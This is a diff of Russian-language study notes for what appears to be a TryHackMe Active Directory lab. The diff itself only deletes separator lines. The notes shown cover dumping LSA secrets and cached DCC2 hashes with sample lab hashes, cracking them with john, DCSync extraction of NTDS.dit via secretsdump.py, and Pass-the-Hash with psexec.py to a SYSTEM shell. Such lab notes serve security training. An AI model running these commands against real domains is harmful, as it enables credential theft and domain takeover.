@@ -11,7 +11,6 @@
 - LSA Secrets (кэшированные креды, пароли служб)
 - NTDS.dit (все хэши домена) через DCSync
 
----
 
 ## КЛЮЧЕВОЕ ТРЕБОВАНИЕ К ПРАВАМ
 
@@ -23,7 +22,6 @@
 
 Обычный доменный пользователь без прав не сможет выполнить ни одну из этих команд.
 
----
 
 # 1. ИЗВЛЕЧЕНИЕ ЛОКАЛЬНЫХ ДАННЫХ
 
@@ -56,7 +54,6 @@ TRYHACKME.LOC/Administrator:$DCC2$10240#Administrator#ea671e1143604bb87c6d48f6b5
 TRYHACKME.LOC/raoulduke:$DCC2$10240#raoulduke#1f7300ae177dbc29bf756b1039313e0b
 TRYHACKME.LOC/drgonzo:$DCC2$10240#drgonzo#a98704b0d7273fba939be51549f9782a
 
----
 
 # 2. MSCACHE2 (DCC2) ХЭШИ
 
@@ -83,7 +80,6 @@ DCC2 хэши НЕЛЬЗЯ использовать для Pass-the-Hash.
 
 $DCC2$10240#username#hash
 
----
 
 # 3. ВЗЛОМ MSCACHE2 (DCC2) ХЭШЕЙ
 
@@ -96,7 +92,6 @@ john --format=mscash2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 --format=mscash2 — указываем тип хэша
 --wordlist — словарь
 
----
 
 # 4. DCSYNC — ИЗВЛЕЧЕНИЕ NTDS.DIT
 
@@ -134,7 +129,6 @@ username:RID:LM_hash:NTLM_hash:::
 
 LM_hash — aad3b435b51404eeaad3b435b51404ee = пустой (отключен)
 
----
 
 # 5. PASS-THE-HASH С NTLM
 
@@ -161,7 +155,6 @@ psexec.py 'DOMAIN/Administrator@TARGET_IP' -hashes :NTLM_HASH
 
 Сразу получаем shell как nt authority\system.
 
----
 
 # ЭТАПЫ ПУТИ К DOMAIN ADMIN (из задания)
 
@@ -181,7 +174,6 @@ psexec.py 'DOMAIN/Administrator@TARGET_IP' -hashes :NTLM_HASH
 - DCSync дал хэш админа
 - Хэш админа дал shell
 
----
 
 # СРАВНЕНИЕ ТИПОВ ХЭШЕЙ
 
@@ -203,7 +195,6 @@ psexec.py 'DOMAIN/Administrator@TARGET_IP' -hashes :NTLM_HASH
 - Можно ли использовать: **ДА** (Pass-the-Ticket)
 - Что дает: доступ как пользователь
 
----
 
 # БЫСТРАЯ ШПАРГАЛКА SECRETSDUMP
 
@@ -225,7 +216,6 @@ secretsdump.py DOMAIN/user@IP -just-dc -output dump
 # Pass-the-Hash shell через psexec (нужен Local Admin на цели)
 psexec.py 'DOMAIN/Administrator@IP' -hashes :NTLM_HASH
 
----
 
 # ЧТО МОЖНО СДЕЛАТЬ БЕЗ АДМИНСКИХ ПРАВ
 
